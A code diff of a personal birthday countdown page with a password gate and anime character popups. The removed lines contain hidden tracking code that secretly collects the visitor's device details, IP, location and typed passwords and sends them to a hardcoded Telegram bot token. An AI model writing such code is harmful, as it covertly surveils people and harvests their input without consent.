@@ -17,63 +17,80 @@
     }
 
     html, body {
-      width: 100%; height: 100%;
+      width: 100%;
+      height: 100%;
       overflow-x: hidden;
       font-family: 'Nunito', sans-serif;
       background: var(--dark);
       color: #fff;
     }
 
-    /* ── BACKGROUND ── */
     #bg {
-      position: fixed; inset: 0; z-index: 0;
+      position: fixed;
+      inset: 0;
+      z-index: 0;
       background: linear-gradient(135deg, #050510 0%, #0a0a2e 30%, #0d1a0d 60%, #050510 100%);
       animation: bgShift 12s ease-in-out infinite alternate;
     }
+
     @keyframes bgShift {
-      0%   { filter: hue-rotate(0deg) brightness(1); }
+      0% { filter: hue-rotate(0deg) brightness(1); }
       100% { filter: hue-rotate(20deg) brightness(1.15); }
     }
 
     .aurora {
-      position: fixed; inset: 0; z-index: 0; pointer-events: none;
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      pointer-events: none;
     }
+
     .aurora::before {
       content: '';
       position: absolute;
-      top: -40%; left: -20%;
-      width: 80%; height: 80%;
+      top: -40%;
+      left: -20%;
+      width: 80%;
+      height: 80%;
       background: radial-gradient(ellipse, rgba(0,255,136,0.07) 0%, transparent 70%);
       animation: auroraMove 8s ease-in-out infinite alternate;
     }
+
     .aurora::after {
       content: '';
       position: absolute;
-      bottom: -40%; right: -20%;
-      width: 80%; height: 80%;
+      bottom: -40%;
+      right: -20%;
+      width: 80%;
+      height: 80%;
       background: radial-gradient(ellipse, rgba(0,100,255,0.06) 0%, transparent 70%);
       animation: auroraMove 10s ease-in-out infinite alternate-reverse;
     }
+
     @keyframes auroraMove {
-      0%   { transform: translate(0,0) scale(1); }
+      0% { transform: translate(0,0) scale(1); }
       100% { transform: translate(5%,5%) scale(1.1); }
     }
 
-    /* ── STARS ── */
-    #stars { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
+    #stars, #particles {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      pointer-events: none;
+    }
+
     .star {
       position: absolute;
       border-radius: 50%;
       background: #fff;
       animation: twinkle var(--d) ease-in-out infinite alternate;
     }
+
     @keyframes twinkle {
-      0%   { opacity: 0.1; transform: scale(0.8); }
-      100% { opacity: 1;   transform: scale(1.2); }
+      0% { opacity: 0.1; transform: scale(0.8); }
+      100% { opacity: 1; transform: scale(1.2); }
     }
 
-    /* ── PARTICLES ── */
-    #particles { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
     .particle {
       position: absolute;
       border-radius: 50%;
@@ -81,23 +98,25 @@
       opacity: 0;
       animation: floatUp var(--d) ease-in var(--delay) infinite;
     }
+
     @keyframes floatUp {
-      0%   { opacity: 0;    transform: translateY(0) scale(1); }
-      20%  { opacity: 0.6; }
-      80%  { opacity: 0.3; }
-      100% { opacity: 0;    transform: translateY(-100vh) scale(0.3); }
+      0% { opacity: 0; transform: translateY(0) scale(1); }
+      20% { opacity: 0.6; }
+      80% { opacity: 0.3; }
+      100% { opacity: 0; transform: translateY(-100vh) scale(0.3); }
     }
 
-    /* ── LAYOUT ── */
     #app {
-      position: relative; z-index: 10;
+      position: relative;
+      z-index: 10;
       min-height: 100vh;
-      display: flex; flex-direction: column;
-      align-items: center; justify-content: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
       padding: 20px;
     }
 
-    /* ── CARD ── */
     .card {
       background: var(--card-bg);
       border: 1px solid rgba(0,255,136,0.25);
@@ -112,12 +131,22 @@
         inset 0 1px 0 rgba(255,255,255,0.05);
       animation: cardGlow 3s ease-in-out infinite alternate;
     }
+
     @keyframes cardGlow {
-      0%   { box-shadow: 0 0 40px rgba(0,255,136,0.08), 0 0 80px rgba(0,255,136,0.04), inset 0 1px 0 rgba(255,255,255,0.05); }
-      100% { box-shadow: 0 0 60px rgba(0,255,136,0.18), 0 0 120px rgba(0,255,136,0.08), inset 0 1px 0 rgba(255,255,255,0.08); }
+      0% {
+        box-shadow:
+          0 0 40px rgba(0,255,136,0.08),
+          0 0 80px rgba(0,255,136,0.04),
+          inset 0 1px 0 rgba(255,255,255,0.05);
+      }
+      100% {
+        box-shadow:
+          0 0 60px rgba(0,255,136,0.18),
+          0 0 120px rgba(0,255,136,0.08),
+          inset 0 1px 0 rgba(255,255,255,0.08);
+      }
     }
 
-    /* ── TITLE ── */
     .subtitle {
       font-family: 'Sacramento', cursive;
       font-size: clamp(1.4rem, 4vw, 2rem);
@@ -126,6 +155,7 @@
       margin-bottom: 4px;
       opacity: 0.85;
     }
+
     .title {
       font-family: 'Cinzel', serif;
       font-size: clamp(1.1rem, 3.5vw, 1.6rem);
@@ -139,60 +169,7 @@
       margin-bottom: 28px;
     }
 
-    /* ── COUNTDOWN ── */
-    .countdown-label {
-      font-family: 'Cinzel', serif;
-      font-size: 0.65rem;
-      letter-spacing: 4px;
-      text-transform: uppercase;
-      color: rgba(255,255,255,0.4);
-      text-align: center;
-      margin-bottom: 12px;
-    }
-    .countdown-grid {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 10px;
-      margin-bottom: 28px;
-    }
-    .countdown-box {
-      background: rgba(0,255,136,0.05);
-      border: 1px solid rgba(0,255,136,0.2);
-      border-radius: 14px;
-      padding: 14px 8px;
-      text-align: center;
-      transition: all 0.3s;
-    }
-    .countdown-box:hover {
-      background: rgba(0,255,136,0.1);
-      border-color: rgba(0,255,136,0.4);
-    }
-    .countdown-num {
-      font-family: 'Cinzel', serif;
-      font-size: clamp(1.6rem, 5vw, 2.4rem);
-      font-weight: 700;
-      color: var(--green);
-      line-height: 1;
-      display: block;
-      text-shadow: 0 0 20px rgba(0,255,136,0.5);
-    }
-    .countdown-unit {
-      font-size: 0.6rem;
-      letter-spacing: 2px;
-      text-transform: uppercase;
-      color: rgba(255,255,255,0.35);
-      margin-top: 4px;
-      display: block;
-    }
-
-    /* ── DIVIDER ── */
-    .divider {
-      height: 1px;
-      background: linear-gradient(90deg, transparent, rgba(0,255,136,0.3), transparent);
-      margin: 20px 0;
-    }
-
-    /* ── PASSWORD ── */
+    .countdown-label,
     .pass-label {
       font-family: 'Cinzel', serif;
       font-size: 0.65rem;
@@ -202,11 +179,59 @@
       text-align: center;
       margin-bottom: 12px;
     }
+
+    .countdown-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+      margin-bottom: 28px;
+    }
+
+    .countdown-box {
+      background: rgba(0,255,136,0.05);
+      border: 1px solid rgba(0,255,136,0.2);
+      border-radius: 14px;
+      padding: 14px 8px;
+      text-align: center;
+      transition: all 0.3s;
+    }
+
+    .countdown-box:hover {
+      background: rgba(0,255,136,0.1);
+      border-color: rgba(0,255,136,0.4);
+    }
+
+    .countdown-num {
+      font-family: 'Cinzel', serif;
+      font-size: clamp(1.6rem, 5vw, 2.4rem);
+      font-weight: 700;
+      color: var(--green);
+      line-height: 1;
+      display: block;
+      text-shadow: 0 0 20px rgba(0,255,136,0.5);
+    }
+
+    .countdown-unit {
+      font-size: 0.6rem;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: rgba(255,255,255,0.35);
+      margin-top: 4px;
+      display: block;
+    }
+
+    .divider {
+      height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(0,255,136,0.3), transparent);
+      margin: 20px 0;
+    }
+
     .pass-row {
       display: flex;
       gap: 10px;
       margin-bottom: 14px;
     }
+
     #passInput {
       flex: 1;
       background: rgba(255,255,255,0.04);
@@ -219,10 +244,12 @@
       outline: none;
       transition: border-color 0.3s, box-shadow 0.3s;
     }
+
     #passInput:focus {
       border-color: rgba(0,255,136,0.5);
       box-shadow: 0 0 16px rgba(0,255,136,0.1);
     }
+
     #passInput::placeholder { color: rgba(255,255,255,0.2); }
     #passInput:disabled { opacity: 0.4; cursor: not-allowed; }
 
@@ -240,10 +267,12 @@
       transition: all 0.3s;
       white-space: nowrap;
     }
+
     #passBtn:hover:not(:disabled) {
       transform: translateY(-2px);
       box-shadow: 0 8px 24px rgba(0,255,136,0.35);
     }
+
     #passBtn:active:not(:disabled) { transform: translateY(0); }
     #passBtn:disabled { opacity: 0.4; cursor: not-allowed; }
 
@@ -257,16 +286,19 @@
       display: none;
       animation: fadeIn 0.4s ease;
     }
+
     #passMsg.wrong {
       background: rgba(255,60,60,0.1);
       border: 1px solid rgba(255,60,60,0.2);
       color: #ff8080;
     }
+
     #passMsg.correct {
       background: rgba(0,255,136,0.08);
       border: 1px solid rgba(0,255,136,0.25);
       color: var(--green);
     }
+
     #passMsg.locked {
       background: rgba(255,150,0,0.08);
       border: 1px solid rgba(255,150,0,0.2);
@@ -283,21 +315,28 @@
 
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(-6px); }
-      to   { opacity: 1; transform: translateY(0); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
-    /* ── REDIRECT OVERLAY ── */
     #redirectOverlay {
-      position: fixed; inset: 0; z-index: 9999;
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
       background: #000;
-      display: flex; flex-direction: column;
-      align-items: center; justify-content: center;
-      opacity: 0; pointer-events: none;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      pointer-events: none;
       transition: opacity 1.5s ease;
     }
+
     #redirectOverlay.show {
-      opacity: 1; pointer-events: all;
+      opacity: 1;
+      pointer-events: all;
     }
+
     #redirectOverlay .msg {
       font-family: 'Sacramento', cursive;
       font-size: clamp(2rem, 6vw, 3.5rem);
@@ -305,6 +344,7 @@
       text-align: center;
       animation: pulse 1.5s ease-in-out infinite;
     }
+
     #redirectOverlay .sub {
       font-family: 'Nunito', sans-serif;
       font-size: 0.9rem;
@@ -312,12 +352,12 @@
       margin-top: 16px;
       letter-spacing: 2px;
     }
+
     @keyframes pulse {
       0%, 100% { text-shadow: 0 0 20px rgba(0,255,136,0.4); }
-      50%       { text-shadow: 0 0 60px rgba(0,255,136,0.9); }
+      50% { text-shadow: 0 0 60px rgba(0,255,136,0.9); }
     }
 
-    /* ── ANIME CHARACTERS ── */
     .anime-char {
       position: fixed;
       z-index: 1000;
@@ -327,6 +367,7 @@
       pointer-events: none;
       transition: opacity 0.4s ease, transform 0.4s ease;
     }
+
     .anime-char.corner-tl { top: 0; left: 0; flex-direction: column; align-items: flex-start; }
     .anime-char.corner-tr { top: 0; right: 0; flex-direction: column; align-items: flex-end; }
     .anime-char.corner-bl { bottom: 0; left: 0; flex-direction: column-reverse; align-items: flex-start; }
@@ -338,9 +379,11 @@
       object-fit: contain;
       filter: drop-shadow(0 0 12px rgba(0,255,136,0.4));
     }
-    .anime-char.corner-tl img { transform: scaleX(1); }
-    .anime-char.corner-tr img { transform: scaleX(-1); }
+
+    .anime-char.corner-tl img,
     .anime-char.corner-bl img { transform: scaleX(1); }
+
+    .anime-char.corner-tr img,
     .anime-char.corner-br img { transform: scaleX(-1); }
 
     .dialogue {
@@ -357,6 +400,7 @@
       position: relative;
       box-shadow: 0 4px 20px rgba(0,0,0,0.5);
     }
+
     .dialogue .char-name {
       color: var(--green);
       font-weight: 700;
@@ -367,27 +411,40 @@
       letter-spacing: 1px;
     }
 
-    /* hidden states */
     .anime-char.corner-tl { transform: translate(-110%, -110%); opacity: 0; }
     .anime-char.corner-tr { transform: translate(110%, -110%); opacity: 0; }
     .anime-char.corner-bl { transform: translate(-110%, 110%); opacity: 0; }
     .anime-char.corner-br { transform: translate(110%, 110%); opacity: 0; }
 
-    .anime-char.show.corner-tl { transform: translate(0, 0); opacity: 1; }
-    .anime-char.show.corner-tr { transform: translate(0, 0); opacity: 1; }
-    .anime-char.show.corner-bl { transform: translate(0, 0); opacity: 1; }
-    .anime-char.show.corner-br { transform: translate(0, 0); opacity: 1; }
+    .anime-char.show.corner-tl,
+    .anime-char.show.corner-tr,
+    .anime-char.show.corner-bl,
+    .anime-char.show.corner-br {
+      transform: translate(0, 0);
+      opacity: 1;
+    }
+
+    @media (max-width: 560px) {
+      .countdown-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+
+      .pass-row {
+        flex-direction: column;
+      }
+
+      #passBtn {
+        width: 100%;
+      }
+    }
   </style>
 </head>
 <body>
-
-  <!-- Background layers -->
   <div id="bg"></div>
   <div class="aurora"></div>
   <div id="stars"></div>
   <div id="particles"></div>
 
-  <!-- Main app -->
   <div id="app">
     <div class="card">
       <p class="subtitle">Something is coming...</p>
@@ -417,7 +474,7 @@
 
       <p class="pass-label">✦ Enter Secret Password ✦</p>
       <div class="pass-row">
-        <input type="password" id="passInput" placeholder="type here..." maxlength="32" />
+        <input type="password" id="passInput" placeholder="type here..." maxlength="32" autocomplete="off" />
         <button id="passBtn">Unlock</button>
       </div>
       <div id="passMsg"></div>
@@ -425,440 +482,356 @@
     </div>
   </div>
 
-  <!-- Redirect overlay -->
   <div id="redirectOverlay">
     <p class="msg">The time has come... 💚</p>
     <p class="sub">Opening your surprise...</p>
   </div>
 
-  <!-- Anime character slots (one per corner) -->
   <div class="anime-char corner-tl" id="char-tl">
-    <div class="dialogue" id="dlg-tl"><span class="char-name" id="name-tl"></span><span id="txt-tl"></span></div>
+    <div class="dialogue"><span class="char-name" id="name-tl"></span><span id="txt-tl"></span></div>
     <img id="img-tl" src="" alt="" />
   </div>
+
   <div class="anime-char corner-tr" id="char-tr">
-    <div class="dialogue" id="dlg-tr"><span class="char-name" id="name-tr"></span><span id="txt-tr"></span></div>
+    <div class="dialogue"><span class="char-name" id="name-tr"></span><span id="txt-tr"></span></div>
     <img id="img-tr" src="" alt="" />
   </div>
+
   <div class="anime-char corner-bl" id="char-bl">
     <img id="img-bl" src="" alt="" />
-    <div class="dialogue" id="dlg-bl"><span class="char-name" id="name-bl"></span><span id="txt-bl"></span></div>
+    <div class="dialogue"><span class="char-name" id="name-bl"></span><span id="txt-bl"></span></div>
   </div>
+
   <div class="anime-char corner-br" id="char-br">
     <img id="img-br" src="" alt="" />
-    <div class="dialogue" id="dlg-br"><span class="char-name" id="name-br"></span><span id="txt-br"></span></div>
+    <div class="dialogue"><span class="char-name" id="name-br"></span><span id="txt-br"></span></div>
   </div>
 
-<script>
-  /* ═══════════════════════════════════════════
-     CONFIG — change these values
-  ═══════════════════════════════════════════ */
-  const TARGET       = new Date('2026-04-15T00:01:00'); // countdown target
-  const CORRECT_PASS = 'mystar';                         // your password
-  const MAX_ATTEMPTS = 10;                               // attempts per day
-  const LS_COUNT     = 'pw_count';
-  const LS_DATE      = 'pw_date';
-  const LS_LOG       = 'pw_log';
+  <script>
+    const TARGET = new Date('2026-04-15T00:01:00+05:30');
+    const CORRECT_PASS = 'ilyishu';
+    const MAX_ATTEMPTS = 10;
+    const LS_COUNT = 'pw_count';
+    const LS_DATE = 'pw_date';
+    const LS_LOG = 'pw_log';
 
-  const BOT_TOKEN    = '8768367657:AAF_pVZxIzXGpnWUpnhoVNHVn-6aOH2QgNs';
-  const CHAT_ID      = '5484213571';
+    let redirected = false;
 
-  /* ═══════════════════════════════════════════
-     TELEGRAM
-  ═══════════════════════════════════════════ */
-  function getDeviceInfo() {
-    const ua = navigator.userAgent;
-    let device  = /Mobile|Android|iPhone|iPad/.test(ua) ? '📱 Mobile' : '💻 Desktop';
-    let os      = 'Unknown';
-    if      (/Windows/.test(ua))  os = 'Windows';
-    else if (/Android/.test(ua))  os = 'Android';
-    else if (/iPhone/.test(ua))   os = 'iPhone';
-    else if (/iPad/.test(ua))     os = 'iPad';
-    else if (/Mac/.test(ua))      os = 'MacOS';
-    else if (/Linux/.test(ua))    os = 'Linux';
-    let browser = 'Unknown';
-    if      (/Edg/.test(ua))                          browser = 'Edge';
-    else if (/Chrome/.test(ua))                       browser = 'Chrome';
-    else if (/Firefox/.test(ua))                      browser = 'Firefox';
-    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
-    else if (/Opera|OPR/.test(ua))                    browser = 'Opera';
-    const screen = `${window.screen.width}x${window.screen.height}`;
-    return { device, os, browser, screen };
-  }
+    const teaseMsgs = [
+      "Ayo… who told you that? Fire them 🔥",
+      "Bestie that's NOT it 💀",
+      "Close… but actually not even close 😭",
+      "You really thought that was it?? 💅",
+      "Nope. Try again, detective 🕵️",
+      "LMAO no. Absolutely not 😂",
+      "My guy really typed THAT 💀💀",
+      "The password is not your crush's name btw 👀",
+      "Error 404: Brain not found 🧠",
+      "Gojo would be disappointed rn fr 😤",
+      "Naruto trained harder than this guess 🍜",
+      "That was so wrong it's almost right… jk it's not 😄"
+    ];
 
-  function sendTelegram(msg) {
-    const info = getDeviceInfo();
-    const now  = new Date();
-    const time = now.toLocaleTimeString();
-    const date = now.toLocaleDateString('en-GB', { day:'2-digit', month:'long', year:'numeric' });
-
-    fetch('https://api.ipify.org?format=json')
-      .then(r => r.json())
-      .then(d => fetch(`https://ipapi.co/${d.ip}/json/`))
-      .then(r => r.json())
-      .then(loc => {
-        const full =
-          `${msg}\n\n` +
-          `📱 Device: ${info.device}\n` +
-          `💻 OS: ${info.os}\n` +
-          `🌐 Browser: ${info.browser}\n` +
-          `📺 Screen: ${info.screen}\n` +
-          `🌍 Country: ${loc.country_name || 'N/A'}\n` +
-          `🏙️ City: ${loc.city || 'N/A'}\n` +
-          `🔌 IP: ${loc.ip || 'N/A'}\n` +
-          `📡 ISP: ${loc.org || 'N/A'}\n` +
-          `🕐 Time: ${time}\n` +
-          `📅 Date: ${date}`;
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: full, parse_mode: 'HTML' })
-        });
-      })
-      .catch(() => {
-        // fallback without IP
-        const full =
-          `${msg}\n\n` +
-          `📱 Device: ${info.device}\n` +
-          `💻 OS: ${info.os}\n` +
-          `🌐 Browser: ${info.browser}\n` +
-          `📺 Screen: ${info.screen}\n` +
-          `🕐 Time: ${time}\n` +
-          `📅 Date: ${date}`;
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: full, parse_mode: 'HTML' })
-        });
-      });
-  }
-
-  /* ═══════════════════════════════════════════
-     STARS & PARTICLES
-  ═══════════════════════════════════════════ */
-  function createStars() {
-    const c = document.getElementById('stars');
-    for (let i = 0; i < 90; i++) {
-      const s = document.createElement('div');
-      s.className = 'star';
-      const sz = Math.random() * 2.5 + 0.5;
-      s.style.cssText = `
-        width:${sz}px; height:${sz}px;
-        top:${Math.random()*100}%;
-        left:${Math.random()*100}%;
-        --d:${(Math.random()*3+1).toFixed(1)}s;
-        animation-delay:${(Math.random()*4).toFixed(1)}s;
-      `;
-      c.appendChild(s);
-    }
-  }
-
-  function createParticles() {
-    const c = document.getElementById('particles');
-    for (let i = 0; i < 35; i++) {
-      const p = document.createElement('div');
-      p.className = 'particle';
-      const sz = Math.random() * 3 + 1;
-      p.style.cssText = `
-        width:${sz}px; height:${sz}px;
-        left:${Math.random()*100}%;
-        bottom:${Math.random()*10}%;
-        --d:${(Math.random()*8+6).toFixed(1)}s;
-        --delay:${(Math.random()*8).toFixed(1)}s;
-      `;
-      c.appendChild(p);
-    }
-  }
-
-  /* ═══════════════════════════════════════════
-     COUNTDOWN
-  ═══════════════════════════════════════════ */
-  let redirected = false;
-
-  function pad(n) { return String(n).padStart(2, '0'); }
-
-  function updateCountdown() {
-    const now  = new Date();
-    const diff = TARGET - now;
-
-    if (diff <= 0) {
-      document.getElementById('cd-days').textContent  = '00';
-      document.getElementById('cd-hours').textContent = '00';
-      document.getElementById('cd-mins').textContent  = '00';
-      document.getElementById('cd-secs').textContent  = '00';
-      if (!redirected) {
-        redirected = true;
-        triggerRedirect();
+    const CHARACTERS = [
+      {
+        name: 'Luffy',
+        img: 'luffy.png',
+        lines: [
+          "I'm gonna be the Pirate King! But first, who's this surprise for? 🏴‍☠️",
+          "Shishishi! Someone's getting a birthday surprise!",
+          "Meat!! And birthday cake!! Best combo ever! 🍖🎂",
+          "I don't know what a countdown is but it sounds exciting!!"
+        ]
+      },
+      {
+        name: 'Naruto',
+        img: 'naruto.png',
+        lines: [
+          "Believe it! This surprise is going to be AMAZING! 🍜",
+          "Dattebayo! I trained hard to keep this secret!",
+          "Even the Hokage doesn't know what's inside… yet! 👀",
+          "Shadow clone jutsu! But the real gift is patience~ 🌀"
+        ]
+      },
+      {
+        name: 'Gojo',
+        img: 'gojo.png',
+        lines: [
+          "Throughout heaven and earth… this surprise is unmatched 😎",
+          "The one and only Gojo is here to say happy birthday 💙",
+          "Infinity can't stop this moment from coming 🌀",
+          "You thought I'd spoil it? I'm the strongest, not the loudest 😏"
+        ]
+      },
+      {
+        name: 'Zoro',
+        img: 'zoro.png',
+        lines: [
+          "I got lost… but I found this birthday page instead 🗺️",
+          "Nothing will cut through this surprise. Trust the process ⚔️",
+          "I have three swords. You have one countdown. Fair trade.",
+          "If this surprise fails, I'll cut myself… just kidding 😅"
+        ]
+      },
+      {
+        name: 'Senku',
+        img: 'senku.png',
+        lines: [
+          "10 billion percent sure this will be the best birthday ever 🧪",
+          "Science says: the wait makes the surprise 10x better!",
+          "I calculated exactly when to show up. I'm always right 📊",
+          "Kingdom of Science approves this birthday 💡"
+        ]
+      },
+      {
+        name: 'Levi',
+        img: 'levi.png',
+        lines: [
+          "Tch. Stop wasting time. The surprise is worth waiting for ⚔️",
+          "I've seen titans. This countdown is nothing. Hold on.",
+          "Don't get emotional. Actually… it's okay if you do 🫡",
+          "Humanity's strongest soldier… delivering birthday vibes 💫"
+        ]
       }
-      return;
+    ];
+
+    const CORNERS = ['tl', 'tr', 'bl', 'br'];
+    let charQueue = [];
+    let activeCorners = {};
+
+    function pad(n) {
+      return String(n).padStart(2, '0');
     }
 
-    const d = Math.floor(diff / 86400000);
-    const h = Math.floor((diff % 86400000) / 3600000);
-    const m = Math.floor((diff % 3600000)  / 60000);
-    const s = Math.floor((diff % 60000)    / 1000);
+    function createStars() {
+      const c = document.getElementById('stars');
+      for (let i = 0; i < 90; i++) {
+        const s = document.createElement('div');
+        s.className = 'star';
+        const sz = Math.random() * 2.5 + 0.5;
+        s.style.cssText = `
+          width:${sz}px;
+          height:${sz}px;
+          top:${Math.random() * 100}%;
+          left:${Math.random() * 100}%;
+          --d:${(Math.random() * 3 + 1).toFixed(1)}s;
+          animation-delay:${(Math.random() * 4).toFixed(1)}s;
+        `;
+        c.appendChild(s);
+      }
+    }
 
-    document.getElementById('cd-days').textContent  = pad(d);
-    document.getElementById('cd-hours').textContent = pad(h);
-    document.getElementById('cd-mins').textContent  = pad(m);
-    document.getElementById('cd-secs').textContent  = pad(s);
-  }
+    function createParticles() {
+      const c = document.getElementById('particles');
+      for (let i = 0; i < 35; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        const sz = Math.random() * 3 + 1;
+        p.style.cssText = `
+          width:${sz}px;
+          height:${sz}px;
+          left:${Math.random() * 100}%;
+          bottom:${Math.random() * 10}%;
+          --d:${(Math.random() * 8 + 6).toFixed(1)}s;
+          --delay:${(Math.random() * 8).toFixed(1)}s;
+        `;
+        c.appendChild(p);
+      }
+    }
 
-  function triggerRedirect() {
-    const ov = document.getElementById('redirectOverlay');
-    ov.classList.add('show');
-    setTimeout(() => { window.location.href = 'scene1.html'; }, 3500);
-  }
+    function updateCountdown() {
+      const now = new Date();
+      const diff = TARGET - now;
 
-  /* ═══════════════════════════════════════════
-     PASSWORD SYSTEM
-  ═══════════════════════════════════════════ */
-  const teaseMsgs = [
-    "Ayo… who told you that? Fire them 🔥",
-    "Bestie that's NOT it 💀",
-    "Close… but actually not even close 😭",
-    "You really thought that was it?? 💅",
-    "Nope. Try again, detective 🕵️",
-    "LMAO no. Absolutely not 😂",
-    "My guy really typed THAT 💀💀",
-    "The password is not your crush's name btw 👀",
-    "Error 404: Brain not found 🧠",
-    "Gojo would be disappointed rn fr 😤",
-    "Naruto trained harder than this guess 🍜",
-    "That was so wrong it's almost right… jk it's not 😄",
-  ];
+      if (diff <= 0) {
+        document.getElementById('cd-days').textContent = '00';
+        document.getElementById('cd-hours').textContent = '00';
+        document.getElementById('cd-mins').textContent = '00';
+        document.getElementById('cd-secs').textContent = '00';
 
-  function getTodayStr() {
-    const d = new Date();
-    return `${d.getFullYear()}-${d.getMonth()}-${d.getDate()}`;
-  }
+        if (!redirected) {
+          redirected = true;
+          triggerRedirect();
+        }
+        return;
+      }
 
-  function getAttempts() {
-    const saved = localStorage.getItem(LS_DATE);
-    if (saved !== getTodayStr()) {
+      const d = Math.floor(diff / 86400000);
+      const h = Math.floor((diff % 86400000) / 3600000);
+      const m = Math.floor((diff % 3600000) / 60000);
+      const s = Math.floor((diff % 60000) / 1000);
+
+      document.getElementById('cd-days').textContent = pad(d);
+      document.getElementById('cd-hours').textContent = pad(h);
+      document.getElementById('cd-mins').textContent = pad(m);
+      document.getElementById('cd-secs').textContent = pad(s);
+    }
+
+    function triggerRedirect() {
+      if (redirected && document.getElementById('redirectOverlay').classList.contains('show')) return;
+      redirected = true;
+      const ov = document.getElementById('redirectOverlay');
+      ov.classList.add('show');
+      setTimeout(() => {
+        window.location.href = 'scene1.html';
+      }, 3500);
+    }
+
+    function getTodayStr() {
+      const d = new Date();
+      return `${d.getFullYear()}-${d.getMonth()}-${d.getDate()}`;
+    }
+
+    function getAttempts() {
+      const saved = localStorage.getItem(LS_DATE);
+      if (saved !== getTodayStr()) {
+        localStorage.setItem(LS_DATE, getTodayStr());
+        localStorage.setItem(LS_COUNT, '0');
+        return 0;
+      }
+      return parseInt(localStorage.getItem(LS_COUNT) || '0', 10);
+    }
+
+    function saveAttempts(n) {
+      localStorage.setItem(LS_COUNT, String(n));
       localStorage.setItem(LS_DATE, getTodayStr());
-      localStorage.setItem(LS_COUNT, '0');
-      return 0;
-    }
-    return parseInt(localStorage.getItem(LS_COUNT) || '0');
-  }
-
-  function saveAttempts(n) {
-    localStorage.setItem(LS_COUNT, String(n));
-    localStorage.setItem(LS_DATE, getTodayStr());
-  }
-
-  function logAttempt(typed, correct) {
-    const log = JSON.parse(localStorage.getItem(LS_LOG) || '[]');
-    log.push({
-      typed,
-      correct,
-      time: new Date().toLocaleTimeString(),
-      date: new Date().toLocaleDateString()
-    });
-    localStorage.setItem(LS_LOG, JSON.stringify(log));
-  }
-
-  function showMsg(type, text) {
-    const el = document.getElementById('passMsg');
-    el.className = type;
-    el.textContent = text;
-    el.style.display = 'block';
-  }
-
-  function updateAttemptsUI(count) {
-    const left = MAX_ATTEMPTS - count;
-    const el   = document.getElementById('attemptsLeft');
-    if (count >= MAX_ATTEMPTS) {
-      el.textContent = '🔒 No attempts left today. Come back tomorrow.';
-    } else {
-      el.textContent = `${left} attempt${left !== 1 ? 's' : ''} remaining today`;
-    }
-  }
-
-  function initPassword() {
-    const input  = document.getElementById('passInput');
-    const btn    = document.getElementById('passBtn');
-    let attempts = getAttempts();
-
-    updateAttemptsUI(attempts);
-
-    if (attempts >= MAX_ATTEMPTS) {
-      input.disabled = true;
-      btn.disabled   = true;
-      showMsg('locked', '🔒 Too many attempts. Try again tomorrow!');
-      return;
     }
 
-    btn.addEventListener('click', handlePass);
-    input.addEventListener('keydown', e => { if (e.key === 'Enter') handlePass(); });
+    function logAttempt(typed, correct) {
+      const log = JSON.parse(localStorage.getItem(LS_LOG) || '[]');
+      log.push({
+        typed,
+        correct,
+        time: new Date().toLocaleTimeString(),
+        date: new Date().toLocaleDateString()
+      });
+      localStorage.setItem(LS_LOG, JSON.stringify(log));
+    }
 
-    function handlePass() {
-      const typed = input.value.trim().toLowerCase();
-      if (!typed) return;
+    function showMsg(type, text) {
+      const el = document.getElementById('passMsg');
+      el.className = type;
+      el.textContent = text;
+      el.style.display = 'block';
+    }
 
-      const isCountdownDone = (TARGET - new Date()) <= 0;
+    function updateAttemptsUI(count) {
+      const left = MAX_ATTEMPTS - count;
+      const el = document.getElementById('attemptsLeft');
+      if (count >= MAX_ATTEMPTS) {
+        el.textContent = '🔒 No attempts left today. Come back tomorrow.';
+      } else {
+        el.textContent = `${left} attempt${left !== 1 ? 's' : ''} remaining today`;
+      }
+    }
 
-      if (typed === CORRECT_PASS) {
-        logAttempt(typed, true);
-        sendTelegram(`✅ <b>CORRECT PASSWORD ENTERED!</b>\n⌨️ Typed: "<b>${typed}</b>"\n😏 She knows the password...`);
-        if (!isCountdownDone) {
-          showMsg('correct', 'Still under construction… wait till the right time 💚');
-        } else {
+    function initPassword() {
+      const input = document.getElementById('passInput');
+      const btn = document.getElementById('passBtn');
+      let attempts = getAttempts();
+
+      updateAttemptsUI(attempts);
+
+      if (attempts >= MAX_ATTEMPTS) {
+        input.disabled = true;
+        btn.disabled = true;
+        showMsg('locked', '🔒 Too many attempts. Try again tomorrow!');
+        return;
+      }
+
+      btn.addEventListener('click', handlePass);
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') handlePass();
+      });
+
+      function handlePass() {
+        const typed = input.value.trim().toLowerCase();
+        if (!typed || redirected) return;
+
+        if (typed === CORRECT_PASS) {
+          logAttempt(typed, true);
+          input.disabled = true;
+          btn.disabled = true;
           showMsg('correct', 'Access granted! Opening your surprise... 💚');
           setTimeout(() => triggerRedirect(), 1500);
-        }
-      } else {
-        attempts++;
-        saveAttempts(attempts);
-        logAttempt(typed, false);
-        sendTelegram(`❌ <b>WRONG PASSWORD ATTEMPT!</b>\n⌨️ She typed: "<b>${typed}</b>"\n📍 Attempt: ${attempts} of ${MAX_ATTEMPTS}`);
-        const msg = teaseMsgs[Math.floor(Math.random() * teaseMsgs.length)];
-        showMsg('wrong', msg);
-        updateAttemptsUI(attempts);
-        input.value = '';
-        if (attempts >= MAX_ATTEMPTS) {
-          input.disabled = true;
